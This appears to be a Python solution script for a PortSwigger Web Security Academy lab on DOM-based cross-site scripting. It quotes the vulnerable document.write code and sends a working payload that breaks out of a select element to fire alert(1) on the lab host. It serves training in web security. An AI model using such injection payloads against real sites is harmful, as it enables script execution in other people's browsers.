'''
This lab contains a DOM-based cross-site scripting vulnerability in the stock checker functionality. It uses the JavaScript document.write function, which writes data out to the page. The document.write function is called with data from location.search which you can control using the website URL. The data is enclosed within a select element.

To solve this lab, perform a cross-site scripting attack that breaks out of the select element and calls the alert function.

Lab link: https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink-inside-select-element
'''

'''Vulnurable code
                        <form id="stockCheckForm" action="/product/stock" method="POST">
                            <input required type="hidden" name="productId" value="1">
                            <script>
                                var stores = ["London","Paris","Milan"];
                                var store = (new URLSearchParams(window.location.search)).get('storeId');
                                document.write('<select name="storeId">');
                                if(store) {
                                    document.write('<option selected>'+store+'</option>');
                                }
                                for(var i=0;i<stores.length;i++) {
                                    if(stores[i] === store) {
                                        continue;
                                    }
                                    document.write('<option>'+stores[i]+'</option>');
                                }
                                document.write('</select>');
                            </script>
'''
import requests


lab_id = '0a7100f00412f6c98252ec8c002600e4' #change based on generated lab
payload = "</select><img src=1 onerror=alert(1)>" # break out of the select tag and implant the malicious code
uri = f"https://{lab_id}.web-security-academy.net/product?productId=1&storeId={payload}" 

r = requests.get(uri)
print('done')